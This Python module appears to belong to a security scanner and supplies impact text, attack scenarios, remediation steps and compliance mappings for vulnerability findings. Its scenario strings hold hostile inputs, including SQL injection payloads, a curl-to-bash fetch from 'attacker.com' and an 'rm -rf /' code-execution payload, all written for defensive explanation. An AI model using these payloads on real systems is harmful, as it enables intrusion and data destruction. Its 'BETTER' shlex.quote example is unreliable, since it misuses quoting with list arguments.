"""
Vulnerability Justification and Remediation Guide

Provides detailed justifications and remediation guidance for security findings.
"""
from dataclasses import dataclass
from typing import Optional, List
from security_scanner.core.severity import Severity


@dataclass
class RemediationGuidance:
    """Detailed remediation guidance for a vulnerability."""
    priority: str
    effort: str  # Low, Medium, High
    steps: List[str]
    code_examples: Optional[str] = None
    references: Optional[List[str]] = None
    prerequisites: Optional[List[str]] = None


class VulnerabilityJustifier:
    """
    Provides detailed justifications and remediation guidance for vulnerabilities.
    
    This helps make findings actionable and educational for developers.
    """
    
    @staticmethod
    def get_business_impact(vulnerability_type: str, severity: Severity) -> str:
        """Get business impact description based on vulnerability type."""
        
        business_impacts = {
            'sql_injection': {
                Severity.CRITICAL: "Complete database compromise leading to: data theft of customer/financial records, data manipulation, potential ransomware, legal liability (GDPR/CCPA violations), loss of customer trust, potential business shutdown.",
                Severity.HIGH: "Significant data breach risk affecting sensitive customer data, potential regulatory fines, reputational damage.",
            },
            'command_injection': {
                Severity.CRITICAL: "Full server compromise allowing attackers to: install malware, steal credentials, pivot to other systems, use server for crypto mining, delete data, establish persistent backdoors. This is a 'game over' vulnerability.",
                Severity.HIGH: "Remote code execution enabling data theft, service disruption, and lateral movement within the network.",
            },
            'rce': {
                Severity.CRITICAL: "Complete application and server compromise. Attackers gain same privileges as application, can execute arbitrary code, access all data, and potentially compromise entire infrastructure.",
            },
            'xss': {
                Severity.HIGH: "Session hijacking affecting user accounts, credential theft through phishing, malware distribution to users, defacement, theft of sensitive user data.",
                Severity.MEDIUM: "Limited XSS attack surface potentially leading to session theft or defacement.",
            },
            'hardcoded_secret': {
                Severity.CRITICAL: "Immediate credential exposure allowing unauthorized access to third-party services, potential financial loss from API abuse, data breaches, supply chain attacks if keys provide access to production systems.",
                Severity.HIGH: "API key exposure leading to service abuse and potential data access.",
            },
            'missing_authentication': {
                Severity.HIGH: "Unauthorized access to sensitive endpoints bypassing all security controls. Attackers can access/modify data without any credentials. Often leads to data breaches and compliance violations.",
            },
            'idor': {
                Severity.HIGH: "Users can access other users' private data by manipulating IDs. Common in data breaches. Violates privacy regulations (GDPR, HIPAA, etc.). Can lead to identity theft, financial fraud.",
            },
            'weak_cryptography': {
                Severity.MEDIUM: "Encrypted data can be decrypted by attackers using known vulnerabilities. Affects data at rest and in transit. May violate compliance requirements (PCI-DSS, HIPAA).",
            },
            'csrf_disabled': {
                Severity.HIGH: "Attackers can perform actions on behalf of authenticated users without their knowledge. Can lead to unauthorized transactions, account modifications, privilege escalation.",
            },
            'debug_mode': {
                Severity.HIGH: "Sensitive information disclosure including: stack traces revealing code structure, environment variables exposing secrets, SQL queries showing database schema, file paths aiding in further attacks.",
            },
        }
        
        # Get specific impact for this vulnerability type and severity
        if vulnerability_type in business_impacts:
            if severity in business_impacts[vulnerability_type]:
                return business_impacts[vulnerability_type][severity]
            # Fallback to any available severity for this type
            for sev, impact in business_impacts[vulnerability_type].items():
                return impact
        
        # Generic fallback
        if severity == Severity.CRITICAL:
            return "Critical security risk that could lead to complete system compromise, data breach, or significant financial/reputational damage."
        elif severity == Severity.HIGH:
            return "Significant security risk that could lead to data breach, unauthorized access, or service disruption."
        elif severity == Severity.MEDIUM:
            return "Moderate security risk that should be addressed to prevent potential exploitation."
        else:
            return "Low-severity security issue that could contribute to attack chains."
    
    @staticmethod
    def get_attack_scenario(vulnerability_type: str) -> str:
        """Get realistic attack scenario for this vulnerability type."""
        
        scenarios = {
            'sql_injection': """
**Attack Scenario:**
1. Attacker identifies vulnerable endpoint through testing
2. Crafts malicious input: `1' OR '1'='1' --` or `1; DROP TABLE users;--`
3. Application builds dangerous query: `SELECT * FROM users WHERE id = 1' OR '1'='1'`
4. Attacker dumps entire database using UNION queries
5. Exfiltrates customer data, credit cards, passwords
6. Sells data on dark web, holds company for ransom""",
            
            'command_injection': """
**Attack Scenario:**
1. Attacker finds input parameter passed to system command
2. Injects malicious commands: `; curl http://attacker.com/backdoor.sh | bash`
3. Gains remote shell access to server
4. Installs crypto miner or ransomware
5. Steals environment variables, AWS keys, database credentials
6. Pivots to internal network, compromises other systems""",
            
            'rce': """
**Attack Scenario:**
1. Attacker sends malicious input to `eval()` or `exec()`
2. Executes arbitrary code: `__import__('os').system('rm -rf /')`
3. Establishes reverse shell for persistent access
4. Escalates privileges, installs backdoors
5. Exfiltrates sensitive data
6. Maintains long-term access for espionage or ransomware""",
            
            'idor': """
**Attack Scenario:**
1. Attacker notices URLs like `/api/user/123`
2. Changes ID to `/api/user/124` or `/api/user/1`
3. Accesses other users' private data (PII, financial info)
4. Iterates through IDs harvesting all user data
5. Uses data for identity theft, social engineering, blackmail
6. Sells database dump on dark web""",
            
            'hardcoded_secret': """
**Attack Scenario:**
1. Attacker finds GitHub repository or decompiled app
2. Discovers hardcoded AWS key  in code
3. Uses key to access S3 buckets, EC2 instances
4. Downloads all customer data from S3
5. Spins up expensive EC2 instances for crypto mining
6. Company receives $50,000 AWS bill + data breach""",
        }
        
        return scenarios.get(vulnerability_type, "Attacker exploits this vulnerability to compromise the system.")
    
    @staticmethod
    def get_remediation_guidance(vulnerability_type: str) -> RemediationGuidance:
        """Get detailed step-by-step remediation guidance."""
        
        guidance_map = {
            'sql_injection': RemediationGuidance(
                priority="IMMEDIATE",
                effort="Low",
                steps=[
                    "1. Identify all database queries in the codebase",
                    "2. Replace string concatenation/formatting with parameterized queries",
                    "3. Use ORM methods (Django ORM, SQLAlchemy) which auto-parameterize",
                    "4. Add input validation as defense-in-depth",
                    "5. Use prepared statements for raw SQL",
                    "6. Test with SQLMap to verify fix"
                ],
                code_examples="""
# BAD:
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# GOOD:
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# BETTER (ORM):
user = User.objects.get(id=user_id)
""",
                references=[
                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                    "https://owasp.org/www-community/attacks/SQL_Injection"
                ],
                prerequisites=["Database ORM library", "Test environment"]
            ),
            
            'command_injection': RemediationGuidance(
                priority="IMMEDIATE",
                effort="Medium",
                steps=[
                    "1. Replace os.system() with subprocess module",
                    "2. Always use shell=False and pass arguments as list",
                    "3. Validate and whitelist all user inputs",
                    "4. Use absolute paths for executables",
                    "5. Run processes with least privilege",
                    "6. Consider containerization for isolation"
                ],
                code_examples="""
# BAD:
os.system(f"cat {filename}")

# GOOD:
subprocess.run(['cat', filename], shell=False)

# BETTER:
import shlex
safe_filename = shlex.quote(filename)
subprocess.run(['cat', safe_filename], shell=False)
""",
                references=[
                    "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
                ]
            ),
            
            'rce': RemediationGuidance(
                priority="IMMEDIATE",
                effort="Low",
                steps=[
                    "1. Remove all uses of eval() and exec()",
                    "2. For JSON parsing, use json.loads() instead of eval()",
                    "3. For math expressions, use ast.literal_eval() or safe-eval library",
                    "4. If dynamic execution is required, use sandboxed environments",
                    "5. Implement strict input validation",
                    "6. Code review all dynamic code execution points"
                ],
                code_examples="""
# BAD:
result = eval(user_input)

# GOOD (for data):
import json
result = json.loads(user_input)

# GOOD (for safe literals):
import ast
result = ast.literal_eval(user_input)
""",
                references=[
                    "https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html"
                ]
            )
        }
        
        return guidance_map.get(
            vulnerability_type,
            RemediationGuidance(
                priority="Review Required",
                effort="Medium",
                steps=[
                    "1. Review vulnerability details and impact",
                    "2. Research best practices for this vulnerability type",
                    "3. Implement secure alternative",
                    "4. Test thoroughly",
                    "5. Deploy and monitor"
                ]
            )
        )
    
    @staticmethod
    def generate_detailed_report(vulnerability) -> dict:
        """Generate a comprehensive detailed report for a vulnerability."""
        
        return {
            'title': vulnerability.title,
            'severity': vulnerability.severity.value if hasattr(vulnerability.severity, 'value') else vulnerability.severity,
            'confidence': vulnerability.confidence.value if hasattr(vulnerability.confidence, 'value') else vulnerability.confidence,
            'location': {
                'file': vulnerability.file_path,
                'line': vulnerability.line,
                'code': vulnerability.raw_match
            },
            'technical_details': {
                'description': vulnerability.description,
                'vulnerability_type': vulnerability.vulnerability_type,
                'cwe_id': vulnerability.cwe_id,
                'root_cause': vulnerability.root_cause,
            },
            'business_impact': VulnerabilityJustifier.get_business_impact(
                vulnerability.vulnerability_type,
                vulnerability.severity
            ),
            'attack_scenario': VulnerabilityJustifier.get_attack_scenario(
                vulnerability.vulnerability_type
            ),
            'remediation': {
                'suggested_fix': vulnerability.suggested_fix,
                'detailed_guidance': VulnerabilityJustifier.get_remediation_guidance(
                    vulnerability.vulnerability_type
                )
            },
            'compliance_impact': VulnerabilityJustifier.get_compliance_impact(
                vulnerability.vulnerability_type
            )
        }
    
    @staticmethod
    def get_compliance_impact(vulnerability_type: str) -> List[str]:
        """Get compliance standards affected by this vulnerability."""
        
        compliance_map = {
            'sql_injection': ['OWASP Top 10 (A03:2021)', 'CWE-89', 'PCI-DSS 6.5.1', 'HIPAA', 'GDPR Art. 32'],
            'command_injection': ['OWASP Top 10 (A03:2021)', 'CWE-78', 'PCI-DSS 6.5.1'],
            'rce': ['OWASP Top 10 (A03:2021)', 'CWE-94', 'PCI-DSS 6.5.1', 'Critical Infrastructure Protection'],
            'xss': ['OWASP Top 10 (A03:2021)', 'CWE-79', 'PCI-DSS 6.5.7'],
            'hardcoded_secret': ['OWASP Top 10 (A07:2021)', 'CWE-798', 'PCI-DSS 6.3.1', 'SOC 2'],
            'idor': ['OWASP Top 10 (A01:2021)', 'CWE-639', 'GDPR Art. 32', 'HIPAA Privacy Rule'],
            'missing_authentication': ['OWASP Top 10 (A07:2021)', 'CWE-306', 'PCI-DSS 8.1', 'SOC 2'],
            'csrf_disabled': ['OWASP Top 10 (A01:2021)', 'CWE-352', 'PCI-DSS 6.5.9'],
        }
        
        return compliance_map.get(vulnerability_type, ['OWASP Top 10', 'General Security Best Practices'])
